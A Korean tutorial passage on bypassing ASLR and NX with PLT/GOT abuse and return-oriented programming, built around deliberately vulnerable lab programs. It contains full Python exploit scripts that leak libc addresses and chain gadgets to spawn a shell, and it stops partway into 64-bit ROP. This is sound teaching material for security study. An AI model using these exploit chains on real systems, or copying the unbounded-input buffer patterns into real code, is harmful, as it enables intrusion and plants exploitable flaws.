@@ -2423,4 +2423,1119 @@ fffdd000-ffffe000 rwxp 00000000 00:00 0                                  [stack]
 ```
 
 
-# Linux Explo
+# Linux Exploitation & Mitigation Part2
+
+# 1. ASLR
+
+Address Space Layout Randomization(ASLR)은 라이브러리, 힙, 스택 영역 등의 주소를 바이너리가 실행될 때마다 랜덤하게 바꿔 RTL과 같이 정해진 주소를 이용한 공격을 막기 위한 보호 기법입니다.
+
+NX bit는 바이너리의 컴파일 옵션에 따라 적용 여부가 결정되었던 것과 달리, ASLR은 서버의 설정 파일에 의해 보호 기법의 적용이 결정됩니다.
+
+Ubuntu 16.04에서는 /proc/sys/kernel/randomize_va_space 파일의 값을 확인하면 서버의 ASLR 설정 여부를 알 수 있습니다. 설정 파일의 값으로는 0, 1, 2가 있습니다. 각 값은 아래와 같은 의미를 갖습니다.
+
+0 : ASLR을 적용하지 않음
+
+1 : 스택, 힙 메모리를 랜덤화
+
+2 : 스택, 힙, 라이브러리 메모리를 랜덤화
+
+
+
+
+만약 해당 파일의 값이 2가 아니라면, 루트 권한으로 다음 명령어를 실행하여 ASLR 보호 기법을 적용할 수 있습니다.
+
+
+```
+# cat /proc/sys/kernel/randomize_va_space 
+0
+# echo 2 > /proc/sys/kernel/randomize_va_space
+# cat /proc/sys/kernel/randomize_va_space
+2
+# 
+```
+
+```
+//example3.c
+//gcc -o example3 example3.c -m32
+#include <stdio.h>
+#include <stdlib.h>
+int main(void){
+  char * buf = (char *)calloc(1, 4096);
+  FILE * fp = 0;
+  size_t sz = 0;
+  fp = fopen("/proc/self/maps", "r");
+  sz = fread(buf, 1, 4096, fp);
+  fwrite(buf, 1, sz, stdout);
+}
+```
+example3.c는 프로세스 자신의 메모리 맵을 읽어 출력해주는 코드입니다. 서버에 ASLR이 켜져있을 때, 라이브러리, 힙, 스택 영역의 주소가 랜덤하게 바뀌는 것을 확인할 수 있습니다.
+
+라이브러리 주소가 계속 바뀌기 때문에, 스택 버퍼 오버플로우 취약점을 공격할 때 정적 주소를 이용한 공격을 사용할 수 없습니다. 하지만 example3의 실행 결과를 보면 알 수 있듯이, 바이너리 코드 영역의 주소는 변하지 않습니다. 이를 이용해 ASLR 보호 기법을 우회하여 익스플로잇할 수 있습니다.
+
+```
+//gcc -o example4 example4.c -fno-stack-protector -mpreferred-stack-boundary=2 -m32
+#include <stdio.h>
+int main(void){
+  char buf[32] = {};
+  puts("Hello World!");
+  puts("Hello ASLR!");
+  scanf("%s", buf);
+  return 0;
+}
+
+```
+
+example4.c는 scanf 함수로 32바이트 크기의 배열 buf에 데이터를 입력받습니다. 이때, "%s" 포맷 스트링을 사용하기 때문에 입력 길이의 제한이 없어 스택 버퍼 오버플로우 취약점이 발생합니다. 최종 목표는 이전과 마찬가지로 /bin/sh 바이너리를 실행하는 것입니다.
+
+우선 바이너리에 NX bit가 적용되어 있는지 확인하겠습니다.
+
+```
+$ readelf -a ./example4 | grep STACK
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
+```
+
+readelf로 확인한 스택 메모리의 권한은 RW로, 바이너리에 NX bit가 적용되어 있습니다. 또한 서버에 ASLR 보호 기법이 적용되어 있기 때문에 이전의 공격 기법은 사용할 수 없습니다.
+
+```
+$ gdb -q ./example4 
+Reading symbols from ./example4...(no debugging symbols found)...done.
+(gdb) disas main
+Dump of assembler code for function main:
+   0x0804845b <+0>:	push   ebp
+   0x0804845c <+1>:	mov    ebp,esp
+   0x0804845e <+3>:	sub    esp,0x20
+   0x08048461 <+6>:	mov    ecx,0x0
+   0x08048466 <+11>:	mov    eax,0x20
+   0x0804846b <+16>:	and    eax,0xfffffffc
+   0x0804846e <+19>:	mov    edx,eax
+   0x08048470 <+21>:	mov    eax,0x0
+   0x08048475 <+26>:	mov    DWORD PTR [ebp+eax*1-0x20],ecx
+   0x08048479 <+30>:	add    eax,0x4
+   0x0804847c <+33>:	cmp    eax,edx
+   0x0804847e <+35>:	jb     0x8048475 <main+26>
+   0x08048480 <+37>:	push   0x8048540
+   0x08048485 <+42>:	call   0x8048320 <puts@plt>
+   0x0804848a <+47>:	add    esp,0x4
+   0x0804848d <+50>:	push   0x804854d
+   0x08048492 <+55>:	call   0x8048320 <puts@plt>
+   0x08048497 <+60>:	add    esp,0x4
+   0x0804849a <+63>:	lea    eax,[ebp-0x20]
+   0x0804849d <+66>:	push   eax
+   0x0804849e <+67>:	push   0x8048559
+   0x080484a3 <+72>:	call   0x8048340 <__isoc99_scanf@plt>
+   0x080484a8 <+77>:	add    esp,0x8
+   0x080484ab <+80>:	mov    eax,0x0
+   0x080484b0 <+85>:	leave  
+   0x080484b1 <+86>:	ret    
+End of assembler dump.
+(gdb) r
+Starting program: ~/Linux_Exploitation_Mitigation/example4 
+Hello World!
+Hello ASLR!
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb) p/x $eip
+$1 = 0x42424242
+(gdb) 
+
+```
+
+먼저 스택 오버플로우 취약점을 이용해 스택의 리턴 주소를 덮어 보겠습니다.
+
+main 함수의 디스어셈블리 결과를 보면, scanf 함수의 2번째 인자인 buf 배열의 주소는 ebp-0x20인 것을 알 수 있습니다.
+
+ebp 레지스터가 가리키는 위치에는 스택 프레임 포인터가 존재하고 ebp+4에 main 함수의 리턴 주소가 위치합니다. 따라서 `"A"'*36 + "BBBB"`를 입력으로 넣었을 때 main 함수가 리턴한 이후 eip 레지스터의 값이 0x42424242로 바뀐 것을 확인할 수 있습니다.
+![](https://i.imgur.com/m497D3W.png)
+
+NX bit가 걸려 있으므로, 프로그램이 비정상 종료하지 않기 위해서는 실행 권한이 있는 코드 영역으로 덮어야 합니다.
+
+앞서 example3 를 순차적으로 실행시킨 결과를 볼 때, 라이브러리, 힙, 스택 메모리의 주소는 랜덤으로 변하지만 바이너리의 코드나 데이터 영역들의 주소는 변하지 않는 것을 알 수 있습니다.
+
+
+
+# 2. PLT, GOT Section
+
+example4의 디스어셈블리 결과를 보면 puts와 scanf 함수를 호출할 때 해당 함수의 라이브러리 코드 주소로 바로 점프하지 않고 PLT 영역으로 점프하는 것을 확인할 수 있습니다.
+
+Procedure Linkage Table(PLT)는 외부 라이브러리 함수를 사용할 수 있도록 주소를 연결해주는 역할을 하는 테이블입니다. Global Offset Table(GOT)는 PLT에서 호출하는 resolve 함수를 통해 구한 라이브러리 함수의 절대 주소가 저장되어 있는 테이블입니다.
+
+ASLR이 적용되어 있는 환경에서, 동적으로 라이브러리를 링크하여 실행되는 바이너리(Dynamically linked binary)는 바이너리가 실행될 때마다 라이브러리가 매핑되는 메모리의 주소가 변합니다. PLT와 GOT 영역이 존재하는 이유는 Dynamically linked binary의 경우 바이너리가 실행되기 전까지 라이브러리 함수의 주소를 알 수 없기 때문입니다. 라이브러리가 메모리에 매핑된 후 라이브러리 함수가 호출되면, 정적 주소를 통해 해당 함수의 PLT와 GOT 영역에 접근함으로써 함수의 주소를 찾습니다.
+
+* puts 함수의 PLT *
+
+```
+   0x8048320 <puts@plt>:	jmp    DWORD PTR ds:0x804a00c
+   0x8048326 <puts@plt+6>:	push   0x0
+   0x804832b <puts@plt+11>:	jmp    0x8048310
+```
+
+* puts 함수의 GOT *
+
+```
+(gdb) x/wx 0x804a00c
+0x804a00c:	0x08048326
+(gdb) 
+```
+
+* example4.c *
+```
+//gcc -o example4 example4.c -fno-stack-protector -mpreferred-stack-boundary=2 -m32 -no-pie
+#include <stdio.h>
+int main(void){
+  char buf[32] = {};
+  puts("Hello World!");
+  puts("Hello ASLR!");
+  scanf("%s", buf);
+  return 0;
+}
+```
+
+* Disassembly of example4's main func *
+
+
+```
+…
+   0x08048480 <+37>:	push   0x8048540
+   0x08048485 <+42>:	call   0x8048320 <puts@plt>
+   0x0804848a <+47>:	add    esp,0x4
+   0x0804848d <+50>:	push   0x804854d
+   0x08048492 <+55>:	call   0x8048320 <puts@plt>
+   0x08048497 <+60>:	add    esp,0x4
+   0x0804849a <+63>:	lea    eax,[ebp-0x20]
+   0x0804849d <+66>:	push   eax
+   0x0804849e <+67>:	push   0x8048559
+   0x080484a3 <+72>:	call   0x8048340 <__isoc99_scanf@plt>
+…
+```
+
+디버깅을 통해 puts 함수를 호출했을 때 PLT에서 어떤 일을 하는지 확인해 보도록 하겠습니다.
+
+```
+(gdb) b*0x8048485
+Breakpoint 1 at 0x8048485
+(gdb) r
+Starting program: ~/example4 
+Breakpoint 1, 0x08048485 in main ()
+(gdb) x/i $eip
+=> 0x8048485 <main+42>:	call   0x8048320 <puts@plt>
+(gdb) si
+0x08048320 in puts@plt ()
+(gdb) x/4i $eip
+=> 0x8048320 <puts@plt>:	jmp    DWORD PTR ds:0x804a00c
+   0x8048326 <puts@plt+6>:	push   0x0
+   0x804832b <puts@plt+11>:	jmp    0x8048310
+   0x8048330 <__libc_start_main@plt>:	jmp    DWORD PTR ds:0x804a010
+(gdb) x/wx 0x804a00c
+0x804a00c:	0x08048326
+(gdb) x/2i 0x8048310
+   0x8048310:	push   DWORD PTR ds:0x804a004
+   0x8048316:	jmp    DWORD PTR ds:0x804a008
+(gdb) x/wx 0x804a008
+0x804a008:	0xf7fee000
+```
+puts@plt+0에서는 0x804a00c 메모리를 참조하여 저장되어있는 값으로 점프합니다. 해당 메모리에는 puts@plt+6의 주소가 저장되어 있습니다. puts@plt+6에서는 스택에 0을 push한 후 0x8048310 함수로 점프합니다.
+
+이후에는 0x804a008 주소에 저장되어 있는 0xf7fee000 함수로 점프합니다.
+
+링커 라이브러리인 ld-linux.so.2 메모리에 있는 0xf7fee000 함수가 리턴하는 시점에 브레이크포인트를 설정해 스택 메모리를 확인해 보았습니다. puts 함수로 점프하는 것으로 보아, 0xf7fee000 함수는 호출된 라이브러리 함수의 주소를 알아내는 함수라는 것을 알 수 있습니다.
+
+```
+(gdb) x/11i 0xf7fee000
+   0xf7fee000:	push   eax
+   0xf7fee001:	push   ecx
+   0xf7fee002:	push   edx
+   0xf7fee003:	mov    edx,DWORD PTR [esp+0x10]
+   0xf7fee007:	mov    eax,DWORD PTR [esp+0xc]
+   0xf7fee00b:	call   0xf7fe77e0
+   0xf7fee010:	pop    edx
+   0xf7fee011:	mov    ecx,DWORD PTR [esp]
+   0xf7fee014:	mov    DWORD PTR [esp],eax
+   0xf7fee017:	mov    eax,DWORD PTR [esp+0x4]
+   0xf7fee01b:	ret    0xc
+(gdb) b*0xf7fee01b
+Breakpoint 2 at 0xf7fee01b
+(gdb) c
+Continuing.
+Breakpoint 2, 0xf7fee01b in ?? () from /lib/ld-linux.so.2
+(gdb) x/wx $esp
+0xffffd520:	0xf7e62ca0
+(gdb) x/i 0xf7e62ca0
+   0xf7e62ca0 <puts>:	push   %ebp
+(gdb) 
+```
+
+
+
+* Abusing PLT,GOT *
+
+
+특정 함수의 PLT를 호출하면 함수의 실제 주소를 호출하는 것과 같은 효과를 나타냅니다. PLT의 주소는 고정되어 있기 때문에 서버에 ASLR 보호 기법이 적용되어 있어도 PLT로 점프하면 RTL과 비슷한 공격이 가능합니다.
+
+example4 예시에서 스택 버퍼 오버플로우 취약점을 이용해 리턴 주소를 puts@plt+6(0x8048326)으로 바꾸고, 첫 번째 인자는 "ASLR!" 문자열의 주소인 0x8048553로 바꿔 보겠습니다.
+
+puts 함수가 실행되어 "ASLR!" 문자열이 출력된 것을 볼 수 있습니다. 하지만 puts 함수가 실행된 후 리턴할 주소는 0x42424242이기 때문에 Segmentation fault가 발생하여 프로그램이 비정상 종료됩니다.
+
+
+```
+$ (python -c 'print "A"*36 + "\x26\x83\x04\x08" + "BBBB" + "\x53\x85\x04\x08"') | ./example4
+Hello World!
+Hello ASLR!
+ASLR!
+[1]    121124 done                              ( python -c 'print "A"*36 + "\x26\x83\x04\x08" + "BBBB" + "\x53\x85\x04\x08"') | 
+       121126 segmentation fault (core dumped)  ./example4
+
+
+```
+
+
+함수가 호출될 때 GOT에 저장된 주소로 점프하기 때문에 GOT에 저장된 값을 바꾸면 원하는 주소로 점프할 수 있습니다.
+
+example4 바이너리의 main 함수에 브레이크포인트를 걸고 실행한 후 puts 함수의 GOT인 0x804a00c 메모리의 값을 0xdeadbeef로 바꾸어 보겠습니다.
+
+```
+$ gdb -q ./example4
+Reading symbols from ./example4...(no debugging symbols found)...done.
+(gdb) b main
+Breakpoint 1 at 0x8048461
+(gdb) r
+Starting program: ~/example4 
+Breakpoint 1, 0x08048461 in main ()
+(gdb) set *0x804a00c = 0xdeadbeef
+(gdb) c
+Continuing.
+Program received signal SIGSEGV, Segmentation fault.
+0xdeadbeef in ?? ()
+(gdb) x/i $eip
+=> 0xdeadbeef:	Cannot access memory at address 0xdeadbeef
+(gdb) 
+```
+
+프로그램을 이어서 실행하면 puts가 호출될 때 puts@got에 저장된 값으로 점프해 eip 레지스터의 값이 0xdeadbeef로 바뀌게 됩니다.
+
+이제 PLT에 존재하는 함수들, 즉 프로그램에서 한 번 이상 사용하는 라이브러리 함수들은 고정된 주소를 통해 호출할 수 있다는 것을 알게 되었습니다. 하지만 익스플로잇 대상 바이너리인 example4에서는 최종 목표인 셸을 획득하는 데 필요한 함수들(system 함수나 exec 계열 함수)을 사용하지 않기 때문에 ASLR 환경에서 직접적으로 해당 함수들을 호출할 수 없습니다.
+
+
+# 3. 32bit Return Oriented Programming (
+
+)
+
+PLT에는 프로그램 내에서 호출하는 함수들만 존재합니다. 하지만 익스플로잇 대상 바이너리인 example4에서는 system과 같은 셸을 획득하는 데 필요한 함수를 사용하지 않기 때문에 ASLR 환경에서 직접적으로 이를 호출할 수 없습니다. 32비트 ELF 바이너리는 ASLR로 랜덤화되는 주소의 범위가 크지 않기 때문에 호출하고자 하는 라이브러리 함수의 주소를 무차별 대입을 통해 맞출 수도 있지만 (약 1/4096), 100% 에 가까운 확률로 익스플로잇할 수 있는 공격 기법이 존재합니다.
+
+Return Oriented Programming(ROP)는 코드 영역에 있는 다양한 코드 가젯들을 조합해 NX bit와 ASLR 보호 기법을 우회할 수 있는 공격 기법입니다.
+
+ROP 기술은 스택 오버플로우와 같은 취약점으로 콜 스택을 통제할 수 있기 때문에 주로 스택 기반 연산을 하는 코드 가젯들이 사용됩니다.
+
+바이너리 코드 영역에 example5와 같은 코드 가젯들이 존재하고 있습니다.
+
+스택 오버플로우 취약점을 통해 리턴 주소 및 그 뒤의 메모리를 원하는 값으로 덮어쓸 수 있다고 가정하였을 때, example5 코드 가젯들로 ebp 레지스터의 값을 0xdeadbeef로 바꾸어 보겠습니다.
+
+```
+//example4.c
+#include <stdio.h>
+int main(void){
+  char buf[32] = {};
+  puts("Hello World!");
+  puts("Hello ASLR!");
+  scanf("%s", buf);
+  return 0;
+}
+
+```
+
+```
+; example5
+0x8048380:
+  pop eax
+  ret
+0x8048480:
+  xchg ebp, ecx
+  ret
+  
+0x8048580:
+  mov ecx, eax
+  ret
+```
+
+
+example5에 있는 코드 가젯들은 모두 ret 명령어로 끝납니다.
+
+이는 하나의 코드 가젯의 실행이 끝난 후 다음 코드 가젯으로 리턴하여 여러 가젯들을 체이닝하여 실행하는 것을 가능하게 해줍니다.
+
+리턴 주소를 시작으로 스택이 다음과 같이 구성되어 있다고 가정해 보겠습니다.
+
+![](https://i.imgur.com/MBhtXuy.png)
+
+현재 esp 레지스터가 가리키고 있는 메모리는 진한 색으로 표시되었습니다.
+
+스택 오버플로우 취약점이 존재하는 함수가 리턴할 때, 리턴 주소가 0x8048380으로 바뀌어 있기 때문에 0x8048380으로 점프합니다.
+
+이 때의 스택과 esp 레지스터의 상태는 다음과 같습니다.
+
+![](https://i.imgur.com/OtTaHf2.png)
+
+0x8048380에서 pop eax 를 실행하면 eax 레지스터에 현재 esp 레지스터가 가리키고 있는 0x41414141이 들어가게 되고, 스택과 esp 레지스터는 다음과 같은 상태가 됩니다.
+
+
+![](https://i.imgur.com/k92mD7Q.png)
+
+0x8048380에 위치한 코드 가젯인 pop eax 를 실행한 후에 ret을 실행하기 때문에 실행 흐름은 현재 esp 레지스터가 가리키고 있는 0x8048580으로 분기합니다.
+
+0x8048580 코드 가젯은 mov ecx, eax 이기 때문에 ecx에 0x41414141이 들어가게 됩니다.
+
+
+이렇듯, ret 명령으로 코드 가젯들을 사용하면 여러 가젯을 연결하여 하나의 가젯으로는 할 수 없는 행위를 할 수 있게 됩니다.
+
+이러한 기술은 마치 리턴을 이용해 여러 코드를 묶어 프로그래밍하는 것과 같아 Return Oriented Programming이라 불리게 되었습니다.
+
+그렇다면 ebp 레지스터의 값을 0xdeadbeef로 바꾸기 위해 구성된 스택을 살펴보도록 하겠습니다.
+
+![](https://i.imgur.com/wOlfWYp.png)
+
+
+이와 같이 스택이 구성되면 아래와 같이 pop eax(0xdeadbeef) + mov ecx, eax + xchg ebp, ecx 명령들이 순차적으로 실행되어 최종적으로는 ebp 레지스터에 0xdeadbeef 값이 들어가게 됩니다.
+
+
+
+* Exploit using ROP *
+
+```
+//gcc -o example4 example4.c -fno-stack-protector -mpreferred-stack-boundary=2 -m32
+#include <stdio.h>
+int main(void){
+  char buf[32] = {};
+  puts("Hello World!");
+  puts("Hello ASLR!");
+  scanf("%s", buf);
+  return 0;
+}
+```
+
+이제 ROP를 이용해 example4 를 공격해 보겠습니다.
+
+익스플로잇의 최종 목표는 system("/bin/sh")를 실행하는 것입니다.
+
+첫 번째 단계는 system 함수의 주소와 "/bin/sh" 문자열의 주소를 찾는 것입니다. 프로그램은 실행될 때마다 라이브러리 주소가 랜덤하게 매핑됩니다. 그러나 한 번 매핑된 라이브러리 주소는 프로그램이 종료될 때까지 바뀌지 않습니다. 이를 이용하여 system 함수와 "/bin/sh" 문자열의 주소를 찾을 수 있습니다.
+
+Leaking libc.so.6 Address
+
+```
+$ gdb -q ./example4
+Reading symbols from ./example4...(no debugging symbols found)...done.
+(gdb) x/3i 0x8048320
+   0x8048320 <puts@plt>:	jmp    DWORD PTR ds:0x804a00c
+   0x8048326 <puts@plt+6>:	push   0x0
+   0x804832b <puts@plt+11>:	jmp    0x8048310
+(gdb) x/3i 0x8048340
+   0x8048340 <__isoc99_scanf@plt>:	jmp    DWORD PTR ds:0x804a014
+   0x8048346 <__isoc99_scanf@plt+6>:	push   0x10
+   0x804834b <__isoc99_scanf@plt+11>:	jmp    0x8048310
+(gdb) 
+```
+
+메모리에 로딩된 libc.so.6 라이브러리의 주소를 구하는 방법에 대해 알아보도록 하겠습니다. 앞서 라이브러리 함수를 사용하고 나면, GOT에 해당 함수의 주소가 저장된다는 것을 배웠습니다. 바이너리에 존재하는 puts 함수의 PLT를 이용해 scanf의 GOT에 있는 scanf 함수의 실제 주소를 출력해보도록 하겠습니다.
+
+먼저 gdb를 이용해 puts의 PLT 주소를 구합니다. main 함수에서 puts@plt의 주소인 0x8048320을 구했습니다. 또한 scanf의 PLT에서 참조하는 주소 0x804a014가 scanf의 GOT 주소인 것을 알 수 있습니다. 공격 코드를 만들기 전에, scanf에서 "%s" 포맷 스트링을 이용해 입력을 받기 때문에 주의해야 할 것이 있습니다.
+
+"%s" 포맷 스트링은 공백이나 개행 등 단어를 구분하는 문자를 입력하면 더이상 입력을 받지 않습니다.
+
+puts 함수의 PLT 주소는 공백 문자로 시작하기 때문에, 해당 문자를 입력한 이후에 공격 코드를 삽입할 수 없습니다.
+
+PLT를 호출하는 과정을 생각해 보면, puts@plt가 아닌 puts@plt+6으로 점프해도 puts@plt를 호출한 것과 같은 결과가 됩니다.
+
+때문에 공격 코드에서는 입력의 종료를 방지하기 위해 0x8048320이 아닌 0x8048326를 사용합니다.
+
+
+scanf의 GOT 주소에 저장된 값을 출력해 보도록 하겠습니다.
+
+```
+$ (python -c 'print "A"*36+"\x26\x83\x04\x08"+"AAAA"+"\x14\xa0\x04\x08"';cat) | ./example4
+Hello World!
+Hello ASLR!
+????
+[1]    124132 broken pipe                       ( python -c 'print "A"*36+"\x26\x83\x04\x08"+"AAAA"+"\x14\xa0\x04\x08"'; cat;  | 
+       124134 segmentation fault (core dumped)  ./example4
+```
+
+출력 결과를 보면, ????와 같은 non-printable character가 출력된 것을 확인할 수 있습니다. 이는 scanf 함수 주소에 아스키 범위를 넘어선 문자가 존재하기 때문입니다.
+
+이렇듯 동적으로 변화하는 아스키 범위 밖의 문자를 읽기 위해 공격 코드를 스크립트로 작성할 필요가 있습니다. 파이썬를 이용해 공격 코드를 작성해 보도록 하겠습니다. 오른쪽 코드는 puts 함수를 호출해 scanf@got의 메모리를 가져오는 파이썬 스크립트입니다.
+
+```
+#!/usr/bin/python2.7
+'''
+example4_leak.py
+'''
+import struct
+import subprocess
+import os
+import pty
+def readline(fd):
+  res = ''
+  try:
+    while True:
+      ch = os.read(fd, 1)
+      res += ch
+      if ch == '\n':
+        return res
+  except:
+    raise
+def writeline(proc, data):
+  try:
+    proc.stdin.write(data + '\n')
+  except:
+    raise
+def p32(val):
+  return struct.pack("<I", val)
+def u32(data):
+  return struct.unpack("<I", data)[0]
+out_r, out_w = pty.openpty()
+s = subprocess.Popen("./example4", stdin=subprocess.PIPE, stdout=out_w)
+print `readline(out_r)`     # Hello World!\n
+print `readline(out_r)`     # Hello ASLR!\n
+payload  = "A"*36           # buf padding
+payload += p32(0x8048326)   # ret addr (puts@plt + 6)
+payload += p32(0xdeadbeef)  # ret after puts
+payload += p32(0x804a014)   # scanf@got
+writeline(s, payload)
+out = readline(out_r)     # memory leakage of scanf@got
+print `out`
+scanf_addr = u32(out[:4])
+print "scanf @ " + hex(scanf_addr)
+```
+
+
+```
+$ python example4_leak.py
+'Hello World!\r\n'
+'Hello ASLR!\r\n'
+'\xc0\xe0\xe2\xf7\r\n'
+scanf @ 0xf7e2e0c0
+```
+
+스크립트를 실행하면 example4로부터 scanf의 주소를 구해 출력하는 것을 볼 수 있습니다.
+
+구한 scanf의 주소와 libc 베이스 주소로부터 scanf 함수 주소까지의 오프셋을 이용해 libc의 베이스 주소를 구할 수 있습니다.
+
+```
+libc 베이스 주소 = scanf 주소 - libc 베이스 주소로부터 scanf 주소까지의 오프셋
+```
+
+
+readelf를 이용해 libc.so.6 파일에서 scanf 함수의 오프셋을 구할 수 있습니다.
+
+```
+$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep scanf
+   424: 0005c0c0   258 FUNC    GLOBAL DEFAULT   13 __isoc99_scanf@@GLIBC_2.7
+```
+
+```
+libc 베이스 주소 = scanf 주소 - 0x5c0c0
+```
+
+
+
+릭된 libc.so.6 라이브러리 주소를 이용하여 셸을 얻어보겠습니다.
+
+익스플로잇에서는 ROP를 통해 scanf 함수를 호출해 scanf@got에는 system 함수의 주소를, scanf@got+4에는 "/bin/sh" 문자열을 입력한 후 scanf@plt 를 호출하여 최종적으로 system("/bin/sh")를 실행합니다.
+
+ROP 체인에서 함수를 호출할 때, 다음 체인을 실행하기 위해 esp 레지스터를 호출한 함수의 인자 다음으로 가리키게 해주어야 합니다.
+
+objdump를 이용해 pop; pop; ret 코드 가젯을 찾아보도록 하겠습니다.
+
+```
+$ objdump -d ./example4 | grep -A3 pop
+ 804830d:	5b                   	pop    %ebx
+ 804830e:	c3                   	ret    
+Disassembly of section .plt:
+--
+ 8048362:	5e                   	pop    %esi
+ 8048363:	89 e1                	mov    %esp,%ecx
+ 8048365:	83 e4 f0             	and    $0xfffffff0,%esp
+ 8048368:	50                   	push   %eax
+--
+ 8048518:	5b                   	pop    %ebx
+ 8048519:	5e                   	pop    %esi
+ 804851a:	5f                   	pop    %edi
+ 804851b:	5d                   	pop    %ebp
+ 804851c:	c3                   	ret    
+ 804851d:	8d 76 00             	lea    0x0(%esi),%esi
+--
+ 8048536:	5b                   	pop    %ebx
+ 8048537:	c3                   	ret    
+```
+
+objdump의 결과를 보면 0x804851a 주소에 pop; pop; ret 코드 가젯이 존재하는 것을 알 수 있습니다
+
+example4.py에서는 pop; pop; ret 코드 가젯(line 43 ~ 45)을 이용하여 esp 레지스터를 scanf 함수의 인자 2개 이후 주소로 가리키게 해주었습니다.
+
+```
+#!/usr/bin/python
+'''
+example4.py
+'''
+import struct
+import subprocess
+import os
+import pty
+import time
+def readline(fd):
+  res = ''
+  try:
+    while True:
+      ch = os.read(fd, 1)
+      res += ch
+      if ch == '\n':
+        return res
+  except:
+    raise
+def read(fd, n):
+  return os.read(fd, n)
+def writeline(proc, data):
+  try:
+    proc.stdin.write(data + '\n')
+  except:
+    raise
+def p32(val):
+  return struct.pack("<I", val)
+def u32(data):
+  return struct.unpack("<I", data)[0]
+out_r, out_w = pty.openpty()    # to ignore buffer
+s = subprocess.Popen("./example4", stdin=subprocess.PIPE, stdout=out_w)
+'''
+0x804851a <__libc_csu_init+90>:  pop    %edi
+0x804851b <__libc_csu_init+91>:  pop    %ebp
+0x804851c <__libc_csu_init+92>:  ret    
+'''
+pop_pop_ret = 0x804851a
+pop_ret = pop_pop_ret + 1
+scanf_plt = 0x8048340
+puts_plt = 0x8048320
+puts_got = 0x804a00c
+string_fmt = 0x8048559      # "%s"
+scanf_got = 0x804a014
+print `readline(out_r)`     # Hello World!\n
+print `readline(out_r)`     # Hello ASLR!\n
+payload  = "A"*36           # buf padding
+payload += p32(puts_plt + 6)   # ret addr (puts@plt + 6)
+payload += p32(pop_ret)  # ret after puts
+payload += p32(scanf_got)   # scanf@got
+payload += p32(scanf_plt)
+payload += p32(pop_pop_ret)
+payload += p32(string_fmt)
+payload += p32(scanf_got)
+payload += p32(scanf_plt)
+payload += p32(0xdeadbeef)
+payload += p32(scanf_got+4)
+print `payload`
+writeline(s, payload)
+libc = u32(readline(out_r)[:4]) - 0x5c0c0
+system = libc + 0x3ada0
+print "libc @ " + hex(libc)
+print "system @ " + hex(system)
+writeline(s, p32(system)+"/bin/sh\x00")
+print "[+] get shell"
+while True:
+  cmd = raw_input("$ ")
+  writeline(s, cmd)
+  time.sleep(0.2)
+  print read(out_r, 1024)
+
+```
+
+![](https://i.imgur.com/yyi7WAa.png)
+
+example4.py를 실행하면 셸을 성공적으로 획득한 것을 볼 수 있습니다.
+
+
+```
+$ python example4.py
+'Hello World!\r\n'
+'Hello ASLR!\r\n'
+'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&\x83\x04\x08\x1b\x85\x04\x08\x14\xa0\x04\x08@\x83\x04\x08\x1a\x85\x04\x08Y\x85\x04\x08\x14\xa0\x04\x08@\x83\x04\x08\xef\xbe\xad\xde\x18\xa0\x04\x08'
+libc @ 0xf7d5b000
+system @ 0xf7d95da0
+[+] get shell
+$ echo "SHELL_TEST"
+SHELL_TEST
+$ ls -al /etc/passwd
+-rw-r--r-- 1 root root 2434 Oct 17 22:18 /etc/passwd
+```
+
+
+# 64 bit ROP
+
+32비트 아키텍쳐에서는 함수 호출시 인자를 스택에 저장하는 반면 64비트 아키텍쳐에서는 함수의 인자를 레지스터와 스택에 저장해 전달합니다.
+```
+// gcc -o call64 call64.c 
+#include <stdio.h>
+int main()
+{
+	printf("%d + %d = %d\n %d + %d = %d\n",1,2,3,4,5,9);
+	return 0;
+}
+```
+
+
+call64.c는 64비트 아키텍쳐의 함수 호출 규약을 확인하기 위해 printf 함수에 7개의 인자를 전달하여 호출하는 코드입니다.
+
+다음은 call64의 디스어셈블리 결과입니다.
+
+```
+$ gdb call64
+(gdb) disas main
+Dump of assembler code for function main:
+   0x0000000000400526 <+0>:	push   rbp
+   0x0000000000400527 <+1>:	mov    rbp,rsp
+   0x000000000040052a <+4>:	sub    rsp,0x8
+   0x000000000040052e <+8>:	push   0x9
+   0x0000000000400530 <+10>:	mov    r9d,0x5
+   0x0000000000400536 <+16>:	mov    r8d,0x4
+   0x000000000040053c <+22>:	mov    ecx,0x3
+   0x0000000000400541 <+27>:	mov    edx,0x2
+   0x0000000000400546 <+32>:	mov    esi,0x1
+   0x000000000040054b <+37>:	mov    edi,0x4005f4
+   0x0000000000400550 <+42>:	mov    eax,0x0
+   0x0000000000400555 <+47>:	call   0x400400 <printf@plt>
+(gdb) x/s 0x4005f4
+0x4005f4:	"%d + %d = %d\n %d + %d = %d\n"
+```
+
+printf 함수 호출 이전에 인자를 각각 레지스터와 스택에 넣고 호출합니다. 디스어셈블리 결과를 보면 64비트에서 함수가 호출될 때 전달되는 인자는 다음과 같습니다.
+
+![](https://i.imgur.com/jXNxnfU.png)
+
+
+rdi,rsi,rdx,rcx,r8,r9 레지스터를 전부 사용하면 다음 인자부터는 스택에 저장합니다. 64비트 아키텍쳐에서는 pop과 같은 명령어를 통해 함수의 인자를 전달하는 방법으로 ROP를 할 수 있습니다.
+
+```
+// gcc -o rop64 rop64.c -fno-stack-protector
+#include <stdio.h>
+#include <unistd.h>
+void gadget() {
+	asm("pop %rdi");
+	asm("pop %rsi");
+	asm("pop %rdx");
+	asm("ret");
+}
+int main()
+{
+	char buf[256];
+	write(1, "Data: ", 6);
+	read(0, buf, 1024); 
+	return 0;
+}
+```
+
+rop64.c에는 스택 버퍼 오버플로우 취약점이 존재합니다. 익스플로잇의 편의를 위해 rdi,rsi,rdx 레지스터에 각각 원하는 값을 전달할 수 있는 ROP 코드 가젯을 제공했습니다.
+
+공격 코드를 작성하기에 앞서 objdump를 사용하여 pop rdi; pop rsi; pop rdx; ret 코드 가젯의 주소를 알아내야 합니다.
+
+```
+$ objdump -d rop64 | grep "gadget" -A6
+0000000000400566 <gadget>:
+  400566:	55                   	push   %rbp
+  400567:	48 89 e5             	mov    %rsp,%rbp
+  40056a:	5f                   	pop    %rdi
+  40056b:	5e                   	pop    %rsi
+  40056c:	5a                   	pop    %rdx
+  40056d:	c3                   	retq
+```
+
+
